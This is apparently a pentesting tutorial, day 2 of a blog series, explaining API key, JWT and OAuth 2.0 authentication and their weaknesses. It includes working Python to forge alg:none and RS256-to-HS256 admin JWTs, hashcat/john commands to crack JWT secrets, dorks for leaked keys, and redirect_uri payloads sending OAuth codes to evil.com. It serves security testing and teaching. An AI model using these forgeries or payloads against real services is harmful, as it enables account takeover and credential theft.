# API Authentication Deep Dive: Keys, Tokens & OAuth 2.0

> **Series:** 30-Day API Pentesting  
> **Day:** 2 — Week 1: API Fundamentals & Recon  
> **Topic:** API Authentication Methods: API Key vs JWT vs OAuth 2.0

---

## 3 Auth Types — Know Them All

| Type | How It Works | Security Risk |
|------|-------------|---------------|
| **API Key** | Static secret string sent with every request | Leaks in logs, JS files, GitHub |
| **JWT** | Signed token with header.payload.signature | alg:none, weak secret, no expiry |
| **OAuth 2.0** | Delegated auth flow — third-party access | Open redirect, CSRF, token theft |

---

## 01 · API Key Authentication

```bash
# 3 ways API keys are sent — all have risks:

# In URL — worst! ends up in server logs, referrer headers
GET /api/data?api_key=sk_live_abc123XYZ

# In Header — better but still static
GET /api/data
X-API-Key: sk_live_abc123XYZ

# In Body — leaks in request logs
POST /api/data
{"api_key": "sk_live_abc123XYZ", "query": "users"}

# ── ATTACK: Find leaked API keys ──
# In JavaScript bundles
grep -r "api_key\|apikey\|api-key\|x-api-key" . 2>/dev/null
grep -r "sk_live\|sk_test\|Bearer\|token" . 2>/dev/null

# On GitHub
site:github.com target.com "api_key"
site:github.com target.com "sk_live"
trufflehog github --org=targetorg

# In Wayback Machine cached pages
gau target.com | grep "api_key="
```

---

## 02 · JWT — JSON Web Token

```
Structure:  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
            .eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0
            .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Part 1 — Header (base64):  {"alg":"HS256","typ":"JWT"}
Part 2 — Payload (base64): {"userId":1,"role":"user","exp":1700000000}
Part 3 — Signature:        HMAC_SHA256(header+payload, secret)
```

```bash
# Decode on jwt.io or command line:
echo "eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1,"role":"user"}

# Always check:
# ✅ alg field — HS256? RS256? none?
# ✅ role/group fields — can you change them?
# ✅ exp — is it expired? does server check?
# ✅ iss/aud — issuer/audience confusion attacks
```

### Attack 1 — alg:none Bypass
```python
# Step 1: Decode original JWT, modify payload
payload = {"userId": 1, "role": "admin", "exp": 9999999999}

# Step 2: Craft new header
header = {"alg": "none", "typ": "JWT"}

# Step 3: Build token (no signature)
import base64, json
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
forged = h.decode() + "." + p.decode() + "."

# Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiJ9.
# Send as: Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
```

### Attack 2 — Weak Secret Brute Force
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt_token.txt /opt/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Using jwt-cracker
npm install -g jwt-cracker
jwt-cracker -t "eyJhbGc..." -a "abcdefghijklmnopqrstuvwxyz" -m 5

# Using john
python3 jwt2john.py jwt_token.txt > hash.txt
john --wordlist=rockyou.txt hash.txt
```

### Attack 3 — RS256 → HS256 Confusion
```python
# If server uses RS256 but you have the PUBLIC key:
# Trick server into using HS256 with public key as secret
import jwt

public_key = open("public.pem").read()
forged = jwt.encode(
    {"userId": 1, "role": "admin"},
    public_key,
    algorithm="HS256"
)
# Server verifies with public key as HMAC secret → accepts forged token!
```

---

## 03 · OAuth 2.0 — Delegated Authorization

```
Authorization Code Flow (most common):

1. User clicks "Login with Google"
2. App redirects: GET /oauth/authorize
   ?client_id=APP_ID
   &redirect_uri=https://target.com/callback
   &response_type=code
   &state=RANDOM_STATE    ← CSRF protection
   &scope=read:email

3. User approves → Google sends:
   GET https://target.com/callback?code=AUTH_CODE&state=RANDOM_STATE

4. App exchanges code for token:
   POST /oauth/token
   {client_id, client_secret, code, redirect_uri}

5. Gets access_token → uses for API calls
```

### Attack 1 — Open Redirect (redirect_uri)
```bash
# Test if redirect_uri is validated:
GET /oauth/authorize
?client_id=APP_ID
&redirect_uri=https://evil.com         # direct replacement
&redirect_uri=https://target.com.evil.com    # subdomain confusion
&redirect_uri=https://evil.com/target.com    # path confusion
&redirect_uri=https://target.com@evil.com   # @ trick
&redirect_uri=https://target.com%2f%2f@evil.com  # encoded

# If code sent to evil.com → attacker exchanges for access_token → ATO!
```

### Attack 2 — Missing State Parameter (CSRF)
```bash
# If state param is not validated:
# 1. Attacker initiates OAuth flow, gets authorization URL
# 2. Stops before approving
# 3. Sends that URL to victim (in email, chat, etc.)
# 4. Victim clicks → approves → auth code sent to attacker's callback
# 5. Attacker's account linked to victim's OAuth identity

# Test: Remove state param entirely — does it still work?
GET /oauth/authorize?client_id=X&redirect_uri=Y&response_type=code
# (no state param)
```

### Attack 3 — Token Leakage in Referrer
```bash
# Implicit flow sends token in URL fragment:
https://target.com/callback#access_token=TOKEN&token_type=bearer

# If page loads external resources (images, scripts):
# Referrer header may contain the token!
# Check: <img src="https://third-party.com/track.png">
#        Referer: https://target.com/callback#access_token=TOKEN
```

---

## 04 · Token Security Testing

```bash
# Test 1 — Expired token
# Decode JWT, change exp to past date, re-encode and send
# Expected: 401. Bug if: 200 OK

# Test 2 — Token reuse after logout
curl -X POST https://api.target.com/auth/logout \
  -H "Authorization: Bearer OLD_TOKEN"

curl https://api.target.com/profile \
  -H "Authorization: Bearer OLD_TOKEN"
# Expected: 401. Bug if: 200 OK (token not revoked)

# Test 3 — Scope confusion
# Get token with scope=read
# Use it on POST /api/admin/users (write scope)
# Expected: 403. Bug if: 201 Created

# Test 4 — Token in URL parameters
# Check if any endpoints accept tokens in URL
GET /api/export?token=JWT_TOKEN
# If yes → token ends up in server logs = bad!
```

---

## Checklist

```
☐  Search for API keys in JS files, GitHub, .env, config files
☐  Decode every JWT on jwt.io — check alg, role, exp, iss
☐  Try alg:none bypass — change header, remove signature
☐  Test redirect_uri in OAuth flows — try evil.com, partial matches
☐  Replay old token after logout — is revocation implemented?
☐  Test scope escalation — read token on write/admin endpoints
☐  Try RS256→HS256 confusion if public key is available
☐  Check for missing state parameter in OAuth authorization
```

---

*30-Day API Pentesting Series — follow for more.*
